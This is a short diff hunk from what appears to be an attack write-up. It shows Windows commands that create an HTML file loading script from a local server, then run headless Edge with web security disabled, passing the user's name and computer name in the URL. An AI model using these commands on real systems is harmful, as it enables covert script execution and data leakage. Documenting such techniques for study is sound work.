@@ -62,7 +62,7 @@ After renaming the directory "./www/**data-U2lsZW5jZSBpcyBnb2xkZW4K**/" and star
 ```batch
 C:\Users\target> ECHO ^<body^>^<script src="http://127.0.0.1:8000/index.js"^>^</script^> > %TMP%\x.html
 
-[WINDOWS + r] msedge --disable-web-security --headless --no-first-run --user-data-dir="%TMP%" "file:///%TMP%\x.html?u=%USERNAME%&c=%COMPUTERNAME%"
+C:\Users\target> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --headless --no-first-run --user-data-dir="%TMP%" "file:///%TMP%\x.html?u=%USERNAME%&c=%COMPUTERNAME%"
 ```
 
 >
